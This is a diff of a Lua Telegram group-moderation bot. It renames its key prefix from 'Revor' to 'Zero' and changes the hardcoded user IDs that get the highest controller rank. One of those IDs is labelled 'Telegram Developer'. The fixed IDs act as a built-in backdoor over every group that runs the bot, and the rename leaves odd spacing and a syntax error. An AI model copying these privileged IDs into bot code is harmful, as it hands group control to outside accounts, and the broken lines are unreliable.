+if tonumber(msg.sender.user_id) == tonumber(Zero ) then
 print('This is reply for Bot')
 return false
 end
@@ -884,47 +890,44 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 1422493638 then
+if tonumber(msg.sender.user_id) == 296685177 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 100100800 then
-msg.Name_Controller = 'مطور السورس '
-msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 100100900 then
-msg.Name_Controller = 'مبرمج السورس '
+elseif tonumber(msg.sender.user_id) == 694635826 then
+msg.Name_Controller = 'Telegram Developer'
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
 msg.The_Controller = 1
 msg.Name_Controller = 'المطور الاساسي '
-elseif Redis:sismember(Revor.."Revor:DevelopersQ:Groups",msg.sender.user_id) == true then
+elseif Redis:sismember(Zero .."Zero :DevelopersQ:Groups",msg.sender.user_id) == true then
 msg.The_Controller = 2
 msg.Name_Controller = 'المطور الثانوي'
-elseif Redis:sismember(Revor.."Revor:Developers:Groups",msg.sender.user_id) == true then
+elseif Redis:sismember(Zero .."Zero :Developers:Groups",msg.sender.user_id) == true then
 msg.The_Controller = 3
-msg.Name_Controller = Redis:get(Revor.."Revor:Developer:Bot:Reply"..msg.chat_id) or 'المطور '
-elseif Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg.chat_id,msg.sender.user_id) == true then
+msg.Name_Controller = Redis:get(Zero .."Zero :Developer:Bot:Reply"..msg.chat_id) or 'المطور '
+elseif Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg.chat_id,msg.sender.user_id) == true then
 msg.The_Controller = 44
-msg.Name_Controller = Redis:get(Revor.."Revor:PresidentQ:Group:Reply"..msg.chat_id) or 'المالك'
-elseif Redis:sismember(Revor.."Revor:TheBasics:Group"..msg.chat_id,msg.sender.user_id) == true then
+msg.Name_Controller = Redis:get(Zero .."Zero :PresidentQ:Group:Reply"..msg.chat_id) or 'المالك'
+elseif Redis:sismember(Zero .."Zero :TheBasics:Group"..msg.chat_id,msg.sender.user_id) == true then
 msg.The_Controller = 4
-msg.Name_Controller = Redis:get(Revor.."Revor:President:Group:Reply"..msg.chat_id) or 'المنشئ الاساسي'
-elseif Redis:sismember(Revor.."Revor:Originators:Group"..msg.chat_id,msg.sender.user_id) == true then
+msg.Name_Controller = Redis:get(Zero .."Zero :President:Group:Reply"..msg.chat_id) or 'المنشئ الاساسي'
+elseif Redis:sismember(Zero .."Zero :Originators:Group"..msg.chat_id,msg.sender.user_id) == true then
 msg.The_Controller = 5
-msg.Name_Controller = Redis:get(Revor.."Revor:Constructor:Group:Reply"..msg.chat_id) or 'المنشئ '
-elseif Redis:sismember(Revor.."Revor:Managers:Group"..msg.chat_id,msg.sender.user_id) == true then
+msg.Name_Controller = Redis:get(Zero .."Zero :Constructor:Group:Reply"..msg.chat_id) or 'المنشئ '
+elseif Redis:sismember(Zero .."Zero :Managers:Group"..msg.chat_id,msg.sender.user_id) == true then
 msg.The_Controller = 6
-msg.Name_Controller = Redis:get(Revor.."Revor:Manager:Group:Reply"..msg.chat_id) or 'المدير '
-elseif Redis:sismember(Revor.."Revor:Addictive:Group"..msg.chat_id,msg.sender.user_id) == true then
+msg.Name_Controller = Redis:get(Zero .."Zero :Manager:Group:Reply"..msg.chat_id) or 'المدير '
+elseif Redis:sismember(Zero .."Zero :Addictive:Group"..msg.chat_id,msg.sender.user_id) == true then
 msg.The_Controller = 7
-msg.Name_Controller = Redis:get(Revor.."Revor:Admin:Group:Reply"..msg.chat_id) or 'الادمن '
-elseif Redis:sismember(Revor.."Revor:Distinguished:Group"..msg.chat_id,msg.sender.user_id) == true then
+msg.Name_Controller = Redis:get(Zero .."Zero :Admin:Group:Reply"..msg.chat_id) or 'الادمن '
+elseif Redis:sismember(Zero .."Zero :Distinguished:Group"..msg.chat_id,msg.sender.user_id) == true then
 msg.The_Controller = 8
-msg.Name_Controller = Redis:get(Revor.."Revor:Vip:Group:Reply"..msg.chat_id) or 'المميز '
-elseif tonumber(msg.sender.user_id) == tonumber(Revor) then
+msg.Name_Controller = Redis:get(Zero .."Zero :Vip:Group:Reply"..msg.chat_id) or 'المميز '
+elseif tonumber(msg.sender.user_id) == tonumber(Zero ) then
 msg.The_Controller = 9
 else
 msg.The_Controller = 10
-msg.Name_Controller = Redis:get(Revor.."Revor:Mempar:Group:Reply"..msg.chat_id) or 'العضو '
+msg.Name_Controller = Redis:get(Zero .."Zero :Mempar:Group:Reply"..msg.chat_id) or 'العضو '
 end  
 if msg.The_Controller == 1 then  
 msg.ControllerBot = true
@@ -953,15 +956,15 @@ end
 if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 7 or msg.The_Controller == 8 or msg.The_Controller == 9 then
 msg.Distinguished = true
 end
-if Redis:get(Revor.."Revor:Lock:text"..msg_chat_id) and not msg.Distinguished then
+if Redis:get(Zero .."Zero :Lock:text"..msg_chat_id) and not msg.Distinguished then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 return false
 end 
 if msg.content.luatele == "messageChatJoinByLink" then
-if Redis:get(Revor.."Revor:Status:Welcome"..msg_chat_id) then
+if Redis:get(Zero .."Zero :Status:Welcome"..msg_chat_id) then
 local UserInfo = LuaTele.getUser(msg.sender.user_id)
 local Get_Chat = LuaTele.getChat(msg_chat_id)
-local Welcome = Redis:get(Revor.."Revor:Welcome:Group"..msg_chat_id)
+local Welcome = Redis:get(Zero .."Zero :Welcome:Group"..msg_chat_id)
 if Welcome then 
 if UserInfo.username then
 UserInfousername = '@'..UserInfo.username
@@ -977,15 +980,15 @@ return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙اطلق دخول ['..UserInfo
 end
 end
 end
-if not msg.Distinguished and msg.content.luatele ~= "messageChatAddMembers" and Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Spam:User") then 
-if tonumber(msg.sender.user_id) == tonumber(Revor) then
+if not msg.Distinguished and msg.content.luatele ~= "messageChatAddMembers" and Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Spam:User") then 
+if tonumber(msg.sender.user_id) == tonumber(Zero ) then
 return false
 end
-local floods = Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Spam:User") or "nil"
-local Num_Msg_Max = Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Num:Spam") or 5
-local post_count = tonumber(Redis:get(Revor.."Revor:Spam:Cont"..msg.sender.user_id..":"..msg_chat_id) or 0)
-if post_count >= tonumber(Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Num:Spam") or 5) then 
-local type = Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Spam:User") 
+local floods = Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Spam:User") or "nil"
+local Num_Msg_Max = Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Num:Spam") or 5
+local post_count = tonumber(Redis:get(Zero .."Zero :Spam:Cont"..msg.sender.user_id..":"..msg_chat_id) or 0)
+if post_count >= tonumber(Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Num:Spam") or 5) then 
+local type = Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Spam:User") 
 if type == "kick" then 
 return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0), LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙قام بالتكرار في المجموعه وتم طرده").Reply,"md",true)
 end
@@ -996,42 +999,42 @@ if type == "keed" then
 return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0}), LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙قام بالتكرار في المجموعه وتم تقييده").Reply,"md",true)  
 end
 if type == "mute" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙قام بالتكرار في المجموعه وتم كتمه").Reply,"md",true)  
 end
 end
-Redis:setex(Revor.."Revor:Spam:Cont"..msg.sender.user_id..":"..msg_chat_id, tonumber(5), post_count+1) 
+Redis:setex(Zero .."Zero :Spam:Cont"..msg.sender.user_id..":"..msg_chat_id, tonumber(5), post_count+1) 
 local edit_id = data.text_ or "nil"  
 Num_Msg_Max = 5
-if Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Num:Spam") then
-Num_Msg_Max = Redis:hget(Revor.."Revor:Spam:Group:User"..msg_chat_id,"Num:Spam") 
+if Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Num:Spam") then
+Num_Msg_Max = Redis:hget(Zero .."Zero :Spam:Group:User"..msg_chat_id,"Num:Spam") 
 end
 end 
 if text and not msg.Distinguished then
 local _nl, ctrl_ = string.gsub(text, "%c", "")  
 local _nl, real_ = string.gsub(text, "%d", "")   
 sens = 400  
-if Redis:get(Revor.."Revor:Lock:Spam"..msg.chat_id) == "del" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
+if Redis:get(Zero .."Zero :Lock:Spam"..msg.chat_id) == "del" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
-elseif Redis:get(Revor.."Revor:Lock:Spam"..msg.chat_id) == "ked" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
+elseif Redis:get(Zero .."Zero :Lock:Spam"..msg.chat_id) == "ked" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
-elseif Redis:get(Revor.."Revor:Lock:Spam"..msg.chat_id) == "kick" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
+elseif Redis:get(Zero .."Zero :Lock:Spam"..msg.chat_id) == "kick" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
-elseif Redis:get(Revor.."Revor:Lock:Spam"..msg.chat_id) == "ktm" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+elseif Redis:get(Zero .."Zero :Lock:Spam"..msg.chat_id) == "ktm" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
 end
 if msg.forward_info and not msg.Developers then -- التوجيه
-local Fwd_Group = Redis:get(Revor.."Revor:Lock:forward"..msg_chat_id)
+local Fwd_Group = Redis:get(Zero .."Zero :Lock:forward"..msg_chat_id)
 if Fwd_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Fwd_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Fwd_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Fwd_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1041,13 +1044,13 @@ end
 
 if msg.reply_markup and msg.reply_markup.luatele == "replyMarkupInlineKeyboard" then
 if not msg.Distinguished then  -- الكيبورد
-local Keyboard_Group = Redis:get(Revor.."Revor:Lock:Keyboard"..msg_chat_id)
+local Keyboard_Group = Redis:get(Zero .."Zero :Lock:Keyboard"..msg_chat_id)
 if Keyboard_Group == "del" then
 var(LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}))
 elseif Keyboard_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Keyboard_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Keyboard_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1063,13 +1066,13 @@ print('This is location')
 end 
 
 if msg.content.entities and msg..content.entities[0] and msg.content.entities[0].type.luatele == "textEntityTypeUrl" and not msg.Distinguished then  -- الماركداون
-local Markduan_Gtoup = Redis:get(Revor.."Revor:Lock:Markdaun"..msg_chat_id)
+local Markduan_Gtoup = Redis:get(Zero .."Zero :Lock:Markdaun"..msg_chat_id)
 if Markduan_Gtoup == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Markduan_Gtoup == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Markduan_Gtoup == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Markduan_Gtoup == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1077,20 +1080,20 @@ print('This is textEntityTypeUrl')
 end 
 
 if msg.content.game and not msg.Distinguished then  -- الالعاب
-local Games_Group = Redis:get(Revor.."Revor:Lock:geam"..msg_chat_id)
+local Games_Group = Redis:get(Zero .."Zero :Lock:geam"..msg_chat_id)
 if Games_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Games_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Games_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Games_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
 print('This is games')
 end 
 if msg.content.luatele == "messagePinMessage" then -- رساله التثبيت
-local Pin_Msg = Redis:get(Revor.."Revor:lockpin"..msg_chat_id)
+local Pin_Msg = Redis:get(Zero .."Zero :lockpin"..msg_chat_id)
 if Pin_Msg and not msg.Managers then
 if Pin_Msg:match("(%d+)") then 
 local PinMsg = LuaTele.pinChatMessage(msg_chat_id,Pin_Msg,true)
@@ -1110,9 +1113,9 @@ end
 
 if msg.content.luatele == "messageChatAddMembers" then -- اضافه اشخاص
 print('This is Add Membeers ')
-Redis:incr(Revor.."Revor:Num:Add:Memp"..msg_chat_id..":"..msg.sender.user_id) 
-local AddMembrs = Redis:get(Revor.."Revor:Lock:AddMempar"..msg_chat_id) 
-local Lock_Bots = Redis:get(Revor.."Revor:Lock:Bot:kick"..msg_chat_id)
+Redis:incr(Zero .."Zero :Num:Add:Memp"..msg_chat_id..":"..msg.sender.user_id) 
+local AddMembrs = Redis:get(Zero .."Zero :Lock:AddMempar"..msg_chat_id) 
+local Lock_Bots = Redis:get(Zero .."Zero :Lock:Bot:kick"..msg_chat_id)
 for k,v in pairs(msg.content.member_user_ids) do
 local Info_User = LuaTele.getUser(v) 
 if Info_User.type.luatele == "userTypeBot" then
@@ -1123,7 +1126,7 @@ LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
 end
 elseif Info_User.type.luatele == "userTypeRegular" then
-Redis:incr(Revor.."Revor:Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) 
+Redis:incr(Zero .."Zero :Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) 
 if AddMembrs == "kick" and not msg.ControllerBot then
 LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
 end
@@ -1132,13 +1135,13 @@ end
 end 
 
 if msg.content.luatele == "messageContact" and not msg.Distinguished then  -- الجهات
-local Contact_Group = Redis:get(Revor.."Revor:Lock:Contact"..msg_chat_id)
+local Contact_Group = Redis:get(Zero .."Zero :Lock:Contact"..msg_chat_id)
 if Contact_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Contact_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Contact_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Contact_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1146,13 +1149,13 @@ print('This is Contact')
 end 
 
 if msg.content.luatele == "messageVideoNote" and not msg.Distinguished then  -- بصمه الفيديو
-local Videonote_Group = Redis:get(Revor.."Revor:Lock:Unsupported"..msg_chat_id)
+local Videonote_Group = Redis:get(Zero .."Zero :Lock:Unsupported"..msg_chat_id)
 if Videonote_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Videonote_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Videonote_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Videonote_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1160,13 +1163,13 @@ print('This is video Note')
 end 
 
 if msg.content.luatele == "messageDocument" and not msg.Distinguished then  -- الملفات
-local Document_Group = Redis:get(Revor.."Revor:Lock:Document"..msg_chat_id)
+local Document_Group = Redis:get(Zero .."Zero :Lock:Document"..msg_chat_id)
 if Document_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Document_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Document_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Document_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1174,13 +1177,13 @@ print('This is Document')
 end 
 
 if msg.content.luatele == "messageAudio" and not msg.Distinguished then  -- الملفات الصوتيه
-local Audio_Group = Redis:get(Revor.."Revor:Lock:Audio"..msg_chat_id)
+local Audio_Group = Redis:get(Zero .."Zero :Lock:Audio"..msg_chat_id)
 if Audio_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Audio_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Audio_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Audio_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1188,13 +1191,13 @@ print('This is Audio')
 end 
 
 if msg.content.luatele == "messageVideo" and not msg.Distinguished then  -- الفيديو
-local Video_Grouo = Redis:get(Revor.."Revor:Lock:Video"..msg_chat_id)
+local Video_Grouo = Redis:get(Zero .."Zero :Lock:Video"..msg_chat_id)
 if Video_Grouo == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Video_Grouo == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Video_Grouo == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Video_Grouo == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1202,13 +1205,13 @@ print('This is Video')
 end 
 
 if msg.content.luatele == "messageVoiceNote" and not msg.Distinguished then  -- البصمات
-local Voice_Group = Redis:get(Revor.."Revor:Lock:vico"..msg_chat_id)
+local Voice_Group = Redis:get(Zero .."Zero :Lock:vico"..msg_chat_id)
 if Voice_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Voice_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Voice_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Voice_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1216,13 +1219,13 @@ print('This is Voice')
 end 
 
 if msg.content.luatele == "messageSticker" and not msg.Distinguished then  -- الملصقات
-local Sticker_Group = Redis:get(Revor.."Revor:Lock:Sticker"..msg_chat_id)
+local Sticker_Group = Redis:get(Zero .."Zero :Lock:Sticker"..msg_chat_id)
 if Sticker_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Sticker_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Sticker_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Sticker_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1230,13 +1233,13 @@ print('This is Sticker')
 end 
 
 if msg.via_bot_user_id ~= 0 and not msg.Distinguished then  -- انلاين
-local Inlen_Group = Redis:get(Revor.."Revor:Lock:Inlen"..msg_chat_id)
+local Inlen_Group = Redis:get(Zero .."Zero :Lock:Inlen"..msg_chat_id)
 if Inlen_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Inlen_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Inlen_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Inlen_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1244,13 +1247,13 @@ print('This is viabot')
 end
 
 if msg.content.luatele == "messageAnimation" and not msg.Distinguished then  -- المتحركات
-local Gif_group = Redis:get(Revor.."Revor:Lock:Animation"..msg_chat_id)
+local Gif_group = Redis:get(Zero .."Zero :Lock:Animation"..msg_chat_id)
 if Gif_group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Gif_group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Gif_group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Gif_group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1258,19 +1261,19 @@ print('This is Animation')
 end 
 
 if msg.content.luatele == "messagePhoto" and not msg.Distinguished then  -- الصور
-local Photo_Group = Redis:get(Revor.."Revor:Lock:Photo"..msg_chat_id)
+local Photo_Group = Redis:get(Zero .."Zero :Lock:Photo"..msg_chat_id)
 if Photo_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Photo_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Photo_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Photo_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
 print('This is Photo delete')
 end
-if msg.content.photo and Redis:get(Revor.."Revor:Chat:Photo"..msg_chat_id..":"..msg.sender.user_id) then
+if msg.content.photo and Redis:get(Zero .."Zero :Chat:Photo"..msg_chat_id..":"..msg.sender.user_id) then
 if msg.content.photo.sizes[1].photo.remote.id then
 idPhoto = msg.content.photo.sizes[1].photo.remote.id
 elseif msg.content.photo.sizes[2].photo.remote.id then
@@ -1280,10 +1283,10 @@ idPhoto = msg.content.photo.sizes[3].photo.remote.id
 end
 local ChatPhoto = LuaTele.setChatPhoto(msg_chat_id,idPhoto)
 if (ChatPhoto.luatele == "error") then
-Redis:del(Revor.."Revor:Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
+Redis:del(Zero .."Zero :Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا استطيع تغيير صوره المجموعه لاني لست ادمن او ليست لديه الصلاحيه ","md",true)    
 end
-Redis:del(Revor.."Revor:Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
+Redis:del(Zero .."Zero :Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تغيير صوره المجموعه المجموعه الى ","md",true)    
 end
 if (text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") 
@@ -1295,14 +1298,14 @@ or text and text:match("[Hh][Tt][Tt][Pp][Ss]://")
 or text and text:match("[Hh][Tt][Tt][Pp]://") 
 or text and text:match("[Ww][Ww][Ww].") 
 or text and text:match(".[Cc][Oo][Mm]")) or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Tt][Kk]") or text and text:match(".[Mm][Ll]") or text and text:match(".[Oo][Rr][Gg]") then 
-local link_Group = Redis:get(Revor.."Revor:Lock:Link"..msg_chat_id)  
+local link_Group = Redis:get(Zero .."Zero :Lock:Link"..msg_chat_id)  
 if not msg.Distinguished then
 if link_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif link_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif link_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif link_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
@@ -1311,95 +1314,95 @@ return false
 end
 end
 if text and text:match("@[%a%d_]+") and not msg.Distinguished then 
-local UserName_Group = Redis:get(Revor.."Revor:Lock:User:Name"..msg_chat_id)
+local UserName_Group = Redis:get(Zero .."Zero :Lock:User:Name"..msg_chat_id)
 if UserName_Group == "del" then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif UserName_Group == "ked" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif UserName_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif UserName_Group == "kick" then
 LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
 print('This is username ')
 end
